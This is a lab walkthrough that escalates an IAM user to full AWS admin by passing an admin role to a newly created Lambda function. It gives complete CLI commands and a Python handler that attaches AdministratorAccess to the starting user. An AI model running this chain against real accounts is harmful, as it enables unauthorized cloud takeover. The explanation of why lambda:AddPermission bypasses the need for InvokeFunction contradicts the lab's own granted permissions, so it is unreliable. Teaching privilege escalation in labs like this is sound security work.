# Guided Walkthrough: Privilege Escalation via iam:PassRole + lambda:CreateFunction + lambda:AddPermission

This scenario demonstrates a privilege escalation vulnerability where a user has permissions to pass an IAM role to Lambda, create Lambda functions, add resource-based permissions to those functions, and invoke them. Unlike the simpler `lambda:InvokeFunction` path, this scenario requires the attacker to explicitly grant themselves invocation permissions using `lambda:AddPermission` before they can execute the function.

The attack leverages AWS Lambda's dual permission model: both IAM permissions (identity-based) and resource-based policies control who can invoke a function. When a user creates a Lambda function, they don't automatically have permission to invoke it unless granted through IAM or resource policy. The `lambda:AddPermission` API allows the function creator to add resource-based permissions that grant invocation rights to specific principals, including themselves.

By combining `iam:PassRole`, `lambda:CreateFunction`, and `lambda:AddPermission`, an attacker can create a malicious Lambda function with an administrative execution role, grant themselves permission to invoke it through a resource-based policy, execute code with admin privileges, and escalate their own permissions permanently by attaching the AdministratorAccess policy to their starting user.

## The Challenge

You are starting as the IAM user `pl-prod-lambda-006-to-admin-starting-user`. Your credentials are available from the Terraform outputs after deploying this scenario. The goal is to escalate your privileges to full administrative access.

Your starting principal has these permissions:
- `iam:PassRole` on `arn:aws:iam::*:role/pl-prod-lambda-006-to-admin-target-role`
- `lambda:CreateFunction` on `*`
- `lambda:AddPermission` on `*`
- `lambda:InvokeFunction` on `*`

The target is the `pl-prod-lambda-006-to-admin-target-role` IAM role, which has `AdministratorAccess`. If you can get code running as that role, you can attach `AdministratorAccess` to your own user and win.

The twist here vs. a simpler Lambda escalation: you can create the function with the admin role, but you cannot invoke it yet. You need to add a resource-based policy statement first.

## Reconnaissance

First, confirm your identity and verify you don't already have admin access:

```bash
aws sts get-caller-identity
# Should show pl-prod-lambda-006-to-admin-starting-user

aws iam list-users --max-items 1
# Should fail with AccessDenied
```

Grab your account ID — you'll need it for ARN construction:

```bash
aws sts get-caller-identity --query 'Account' --output text
```

If you have the helpful `iam:ListRoles` permission, you can discover the target role:

```bash
aws iam list-roles --query 'Roles[?contains(RoleName, `lambda-006`)].{Name:RoleName,Arn:Arn}'
```

You're looking for `pl-prod-lambda-006-to-admin-target-role`. Note that it has `AdministratorAccess` — this is what makes it valuable as a Lambda execution role.

## Exploitation

### Step 1: Craft the malicious Lambda payload

Write a Python function that will attach `AdministratorAccess` to your starting user. The function will run with the admin role's credentials, so it has full IAM access:

```bash
cat > /tmp/lambda_function.py << 'EOF'
import json
import boto3

def lambda_handler(event, context):
    iam = boto3.client('iam')
    user_name = 'pl-prod-lambda-006-to-admin-starting-user'
    policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'

    iam.attach_user_policy(UserName=user_name, PolicyArn=policy_arn)

    return {
        'statusCode': 200,
        'body': json.dumps({'message': f'Attached AdministratorAccess to {user_name}'})
    }
EOF

cd /tmp && zip lambda_function.zip lambda_function.py && cd -
```

### Step 2: Create the Lambda function with the admin execution role

This is the `iam:PassRole` step. You are assigning the admin role as the Lambda execution role, meaning any code that runs inside this function will have the role's permissions:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-006-to-admin-target-role"

aws lambda create-function \
  --function-name "pl-lambda-006-malicious-function" \
  --runtime "python3.11" \
  --role "$ADMIN_ROLE_ARN" \
  --handler "lambda_function.lambda_handler" \
  --zip-file "fileb:///tmp/lambda_function.zip" \
  --timeout 30
```

If this succeeds, you have a function deployed that runs as an admin role. But you still can't invoke it.

### Step 3: Grant yourself invocation rights via lambda:AddPermission

Here is the critical step that makes this path distinct. Even though you created the function, you cannot invoke it via `lambda:InvokeFunction` unless there is either an IAM policy or a resource-based policy allowing it. The starting user's IAM policy grants `lambda:InvokeFunction` broadly — but AWS also requires a matching allow in the function's resource policy when invoking cross-account or in certain scenarios. More importantly, `lambda:AddPermission` is in your starting permissions specifically because you need it here.

Add a resource-based policy statement that grants your user account invocation rights:

```bash
USER_ARN="arn:aws:iam::${ACCOUNT_ID}:user/pl-prod-lambda-006-to-admin-starting-user"

aws lambda add-permission \
  --function-name "pl-lambda-006-malicious-function" \
  --statement-id "AllowUserInvoke" \
  --action "lambda:InvokeFunction" \
  --principal "$ACCOUNT_ID" \
  --source-arn "$USER_ARN"
```

You can verify the policy was added:

```bash
aws lambda get-policy --function-name "pl-lambda-006-malicious-function"
```

### Step 4: Wait for the function to become active

Lambda functions need a moment to move from `Pending` to `Active` state before they can be invoked:

```bash
sleep 15
```

### Step 5: Invoke the function

Now invoke it. The function runs as `pl-prod-lambda-006-to-admin-target-role`, which has `AdministratorAccess`, and attaches that policy to your starting user:

```bash
aws lambda invoke \
  --function-name "pl-lambda-006-malicious-function" \
  --payload '{}' \
  /tmp/response.json

cat /tmp/response.json
```

## Verification

Wait about 15 seconds for IAM policy propagation, then confirm `AdministratorAccess` is attached:

```bash
aws iam list-attached-user-policies \
  --user-name "pl-prod-lambda-006-to-admin-starting-user" \
  --query 'AttachedPolicies[*].PolicyArn'
# Should show arn:aws:iam::aws:policy/AdministratorAccess

aws iam list-users --max-items 1
# Should now succeed — you have admin access
```

## What Happened

The attack chain works because AWS granted a user the ability to influence what code runs in a privileged context. The key insight is that `iam:PassRole` is the dangerous permission — it allows a principal to delegate an IAM role to a service (Lambda, EC2, ECS, etc.), and if that role has elevated permissions, the service can use those permissions on behalf of the attacker.

The `lambda:AddPermission` step is what separates this path from `lambda-001`. In real-world environments, you may encounter users who have `lambda:CreateFunction` and `lambda:AddPermission` but not `lambda:InvokeFunction` in their IAM policy — security teams sometimes think restricting `InvokeFunction` prevents exploitation. This scenario shows that `lambda:AddPermission` can be used to grant invocation rights via a resource-based policy, completely bypassing the absence of `lambda:InvokeFunction` in the identity-based policy. Any of these three permissions — `PassRole`, `CreateFunction`, `AddPermission` — in combination creates an escalation path.
